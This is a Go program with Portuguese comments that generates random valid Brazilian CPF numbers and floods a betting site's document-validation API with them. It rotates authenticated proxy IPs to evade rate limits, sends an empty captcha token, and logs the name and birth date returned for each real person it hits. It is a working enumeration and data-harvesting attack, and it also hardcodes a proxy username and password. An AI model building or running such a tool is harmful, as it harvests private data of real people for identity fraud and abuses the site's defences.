package main

import (
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/enetx/g"
	"github.com/enetx/surf"
)

// Configurações do Proxy
const (
	PROXY_HOST = "pybpm-ins-hxqlzicm.pyproxy.io"
	PROXY_PORT = "2510"
	PROXY_USER = "liderbet1-zone-adam-region-br"
	PROXY_PASS = "Aa10203040"
)

// User Agent
const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

// Estrutura para resposta da API de validação
type ValidateResponse struct {
	Success bool        `json:"success,omitempty"`
	Data    interface{} `json:"data,omitempty"`
	Message string      `json:"message,omitempty"` // Para armazenar mensagem processada
	Valid   bool        `json:"valid,omitempty"`   // Para compatibilidade
}

// calcularDigito calcula um dígito verificador de CPF
func calcularDigito(cpfParcial []int, multiplicadores []int) string {
	soma := 0
	for i := 0; i < len(cpfParcial); i++ {
		soma += cpfParcial[i] * multiplicadores[i]
	}
	resto := soma % 11
	if resto < 2 {
		return "0"
	}
	return fmt.Sprintf("%d", 11-resto)
}

// gerarCPF gera um CPF brasileiro válido aleatório
func gerarCPF() string {
	// Gera os 9 primeiros dígitos aleatórios
	cpf := make([]int, 9)
	for i := range cpf {
		cpf[i] = rand.Intn(10)
	}

	// Calcula o primeiro dígito verificador
	multiplicadores1 := []int{10, 9, 8, 7, 6, 5, 4, 3, 2}
	digito1, _ := strconv.Atoi(calcularDigito(cpf, multiplicadores1))
	cpf = append(cpf, digito1)

	// Calcula o segundo dígito verificador
	multiplicadores2 := []int{11, 10, 9, 8, 7, 6, 5, 4, 3, 2}
	digito2, _ := strconv.Atoi(calcularDigito(cpf, multiplicadores2))
	cpf = append(cpf, digito2)

	// Converte para string
	cpfStr := ""
	for _, d := range cpf {
		cpfStr += fmt.Sprintf("%d", d)
	}

	return cpfStr
}

// criarCliente cria um cliente HTTP com proxy configurado
func criarCliente() *surf.Client {
	// URL do proxy com autenticação
	proxyURL := fmt.Sprintf("http://%s:%s@%s:%s", PROXY_USER, PROXY_PASS, PROXY_HOST, PROXY_PORT)

	fmt.Println("🚀 Criando cliente HTTP com Proxy...")
	fmt.Printf("🌐 Proxy: %s:%s\n", PROXY_HOST, PROXY_PORT)
	fmt.Printf("👤 Usuário: %s\n", PROXY_USER)

	client := surf.NewClient().
		Builder().
		Proxy(proxyURL).
		UserAgent(USER_AGENT).
		Build()

	return client
}

// criarClienteSilencioso cria um cliente HTTP com proxy configurado sem logs
func criarClienteSilencioso() *surf.Client {
	// URL do proxy com autenticação
	proxyURL := fmt.Sprintf("http://%s:%s@%s:%s", PROXY_USER, PROXY_PASS, PROXY_HOST, PROXY_PORT)

	client := surf.NewClient().
		Builder().
		Proxy(proxyURL).
		UserAgent(USER_AGENT).
		Build()

	return client
}

// enviarPayload envia requisição para validar CPF
// Cria um novo cliente para cada requisição para garantir IP diferente
func enviarPayload(cpf string) (*ValidateResponse, error) {
	// Cria um novo cliente para cada requisição (nova conexão = novo IP)
	client := criarClienteSilencioso()

	apiURL := "https://7k.bet.br/api/documents/validate"

	// Estrutura do payload (similar ao exemplo fornecido)
	// Passa o map diretamente para a biblioteca surf serializar
	payload := map[string]string{
		"number":        cpf,
		"captcha_token": "",
	}

	// Faz a requisição POST - passando o payload diretamente
	// A biblioteca surf deve serializar automaticamente o map para JSON
	// Connection: close desabilita o keep-alive para forçar nova conexão
	resp := client.Post(g.String(apiURL), payload).
		SetHeaders("Accept", "application/json", "Content-Type", "application/json", "Connection", "close").
		Do()

	if resp.IsErr() {
		return nil, fmt.Errorf("erro na requisição: %w", resp.Err())
	}

	response := resp.Ok()

	// Verifica se recebeu erro 429 (Too Many Requests)
	if response.StatusCode == 429 {
		return nil, fmt.Errorf("429: Too Many Requests")
	}

	// Parse da resposta
	body := string(response.Body.String())

	// Tenta fazer parse do JSON
	var genericResp map[string]interface{}
	if err := json.Unmarshal([]byte(body), &genericResp); err != nil {
		// Se não conseguir fazer parse, retorna a resposta raw como mensagem
		return &ValidateResponse{
			Valid:   false,
			Success: false,
			Message: body,
		}, nil
	}

	// Cria a resposta estruturada
	validateResp := ValidateResponse{}

	// Extrai o campo success
	if success, ok := genericResp["success"].(bool); ok {
		validateResp.Success = success
		validateResp.Valid = success // Para compatibilidade
	}

	// Extrai a mensagem do campo data
	if data, ok := genericResp["data"]; ok {
		if dataStr, ok := data.(string); ok {
			// Se data for string, é uma mensagem de erro
			validateResp.Message = dataStr
		} else if dataObj, ok := data.(map[string]interface{}); ok {
			// Se data for objeto, é sucesso - formata uma mensagem amigável
			if name, ok := dataObj["name"].(string); ok {
				if birthDate, ok := dataObj["birth_date"].(string); ok {
					validateResp.Message = fmt.Sprintf("CPF válido - Nome: %s, Data de nascimento: %s", name, birthDate)
				} else {
					validateResp.Message = fmt.Sprintf("CPF válido - Nome: %s", name)
				}
			} else {
				validateResp.Message = "CPF válido"
			}
		}
	}

	// Se ainda não tiver mensagem, tenta outros campos
	if validateResp.Message == "" {
		if msg, ok := genericResp["message"].(string); ok && msg != "" {
			validateResp.Message = msg
		} else if msg, ok := genericResp["error"].(string); ok && msg != "" {
			validateResp.Message = msg
		} else {
			validateResp.Message = body
		}
	}

	return &validateResp, nil
}

// worker processa CPFs em uma goroutine
func worker(id int, jobs <-chan string) {
	for cpf := range jobs {
		resp, err := enviarPayload(cpf)
		if err != nil {
			if strings.Contains(err.Error(), "429") {
				fmt.Printf("⚠️  CPF %s: Erro 429 (Too Many Requests)\n", cpf)
				// Em caso de 429, aguarda antes de continuar
				time.Sleep(5 * time.Second)
			} else if strings.Contains(err.Error(), "Only one usage") || strings.Contains(err.Error(), "connectex") {
				// Erro de socket em uso - aguarda um pouco antes de tentar novamente
				fmt.Printf("⚠️  CPF %s: Erro de conexão, aguardando...\n", cpf)
				time.Sleep(200 * time.Millisecond)
				// Tenta novamente
				continue
			} else {
				fmt.Printf("❌ CPF %s: Erro - %v\n", cpf, err)
			}
			continue
		}

		// Mostra o resultado
		if resp.Success || resp.Valid {
			if resp.Message != "" {
				fmt.Printf("✅ CPF %s: %s\n", cpf, resp.Message)
			} else {
				fmt.Printf("✅ CPF %s: Válido!\n", cpf)
			}
		} else {
			if resp.Message != "" {
				fmt.Printf("❌ CPF %s: %s\n", cpf, resp.Message)
			} else {
				fmt.Printf("❌ CPF %s: Inválido\n", cpf)
			}
		}

		// Pequeno delay entre requisições para evitar muitos sockets abertos simultaneamente
		// Isso ajuda a evitar o erro "Only one usage of each socket address"
		time.Sleep(50 * time.Millisecond)
	}
}

// iniciarLoop inicia o loop de validação de CPF usando threads
func iniciarLoop(numThreads int) {
	fmt.Printf("🔄 Loop de validação de CPF iniciado com %d threads...\n", numThreads)

	// Canal para enviar CPFs para as workers (buffer maior para melhor performance)
	jobs := make(chan string, numThreads*10)

	// Cria as workers em paralelo
	for i := 0; i < numThreads; i++ {
		go worker(i+1, jobs)
	}
	fmt.Printf("✅ %d workers criadas e iniciadas\n", numThreads)

	// Calcula delay baseado no número de threads para evitar muitos sockets simultâneos
	// Mais threads = mais delay para evitar saturação de sockets
	delay := time.Duration(100/numThreads) * time.Millisecond
	if delay < 10*time.Millisecond {
		delay = 10 * time.Millisecond
	}

	// Gera CPFs continuamente e envia para o canal
	for {
		cpf := gerarCPF()
		jobs <- cpf
		// Delay ajustado para evitar muitos sockets abertos simultaneamente
		time.Sleep(delay)
	}
}

// abrirSite abre o site e inicia a validação de CPF
func abrirSite(site string, numThreads int) {
	// Adiciona https:// se não tiver protocolo
	url := site
	if !strings.HasPrefix(site, "http://") && !strings.HasPrefix(site, "https://") {
		url = fmt.Sprintf("https://%s", site)
	}

	fmt.Printf("\n🌍 Abrindo site: %s\n", url)

	// URL do proxy com autenticação
	proxyURL := fmt.Sprintf("http://%s:%s@%s:%s", PROXY_USER, PROXY_PASS, PROXY_HOST, PROXY_PORT)

	fmt.Println("🚀 Criando cliente HTTP com Proxy...")
	fmt.Printf("🌐 Proxy: %s:%s\n", PROXY_HOST, PROXY_PORT)
	fmt.Printf("👤 Usuário: %s\n", PROXY_USER)
	fmt.Printf("🧵 Threads configuradas: %d\n", numThreads)

	client := surf.NewClient().
		Builder().
		Proxy(proxyURL).
		UserAgent(USER_AGENT).
		Build()

	// Faz requisição GET para abrir o site
	// Connection: close desabilita o keep-alive
	resp := client.Get(g.String(url)).
		SetHeaders("Connection", "close").
		Do()
	if resp.IsErr() {
		log.Fatalf("❌ Erro ao abrir o site: %v", resp.Err())
	}

	fmt.Println("✅ Site acessado com sucesso!")
	fmt.Printf("📍 URL atual: %s\n", url)
	fmt.Printf("📊 Status Code: %d\n", resp.Ok().StatusCode)

	// Canal para receber sinais do sistema
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	// Inicia o loop de validação em uma goroutine
	go iniciarLoop(numThreads)

	fmt.Println("\n⏸️  Pressione Ctrl+C para encerrar...")

	// Aguarda sinal de interrupção
	<-sigChan
	fmt.Println("\n\n👋 Encerrando programa...")
	os.Exit(0)
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("❌ Uso: go run abrir_site_proxy.go <site> [threads]")
		fmt.Println("Exemplo: go run abrir_site_proxy.go 7k.bet.br")
		fmt.Println("Exemplo: go run abrir_site_proxy.go 7k.bet.br 10")
		os.Exit(1)
	}

	site := os.Args[1]

	// Número de threads (padrão: 5)
	numThreads := 5
	if len(os.Args) >= 3 {
		threads, err := strconv.Atoi(os.Args[2])
		if err != nil || threads < 1 || threads > 10000 {
			fmt.Println("⚠️  Número de threads inválido. Usando padrão: 5")
		} else {
			numThreads = threads
		}
	}

	// Inicializa o gerador de números aleatórios
	rand.Seed(time.Now().UnixNano())

	abrirSite(site, numThreads)
}
